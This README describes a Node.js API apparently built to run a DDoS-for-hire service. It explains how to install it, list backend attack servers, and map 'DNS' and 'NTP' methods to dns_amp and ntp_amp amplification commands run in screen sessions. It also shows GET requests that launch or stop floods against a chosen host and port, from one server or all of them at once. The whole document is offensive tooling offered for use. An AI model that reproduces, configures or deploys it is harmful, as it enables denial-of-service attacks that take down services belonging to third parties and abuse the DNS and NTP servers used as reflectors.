<h2>NodeJS API for Layer 3/4 attacks</h2>

<h3>Coded by forky (tg: ***@yfork***)</h3>

<h4>This API is very secure and fast (taking 2x the ping between API and backend, if the ping is 60ms it will take only 120ms to launch the attack)</h4>


<h1>Installation:</h1>

```sh
curl -sL https://deb.nodesource.com/setup_16.x | sudo bash -
sudo apt -y install nodejs
npm i express
```

<h1>Setup:</h1>

<h3>Update servers.json</h3><br>

```json
{
    "alpha": {
        "name": "alpha",
        "ip": "1.1.1.1",
        "port": 3000
    },
    "beta": {
        "name": "beta",
        "ip": "2.2.2.2",
        "port": 3000
    }
}
```

<h3>Update commands.json</h3><br>

```json
{
    "DNS": "screen -dmS attack_${attack_id} ./dns_amp ${host} ${port} dns.txt 1 250000 ${time}",
    "NTP": "screen -dmS attack_${attack_id} ./ntp_amp ${host} ${port} ntp.txt 1 250000 ${time}",
    "STOP": "screen -dm pkill -f ${host}"
}
```

<h3>Update api.js:</h3><br>

```
const api_port: Your API HTTP Port
const socket_token: Your secret Token for the TCP Socket
const api_key: Your API Key
const domain_lock: true or false (if its set to true you can only access the API if using the domain on api_domain)
```

<h3>Update socket.js:</h3><br>

```
const socket_port: Your socket port
const socket_token: Your secret Token for the TCP Socket (must be same as api.js)
const allowed_ips: The api.js server IP
```

### Reverse Proxy

We recommend making a reverse proxy using Nginx to use your API:

```conf
server {
    listen 80;
    server_name api.yourdomain.com;
    location /api/attack {
        proxy_pass http://backend:3000/api/attack;
    }
}
```

Replace `'http://backend:3000/api/attack'` with your API server URL

### Using the API

Send a GET request to the API using the required fields

GET `https://api.yourdomain.com/api/attack?host=1.1.1.1&port=80&time=120&method=DNS&server=alpha`

You can set &server=all to launch to all servers

You can stop attacks by sending a GET request to the API using &method=stop

GET `https://api.yourdomain.com/api/attack?host=1.1.1.1&port=80&time=120&method=stop&server=alpha`

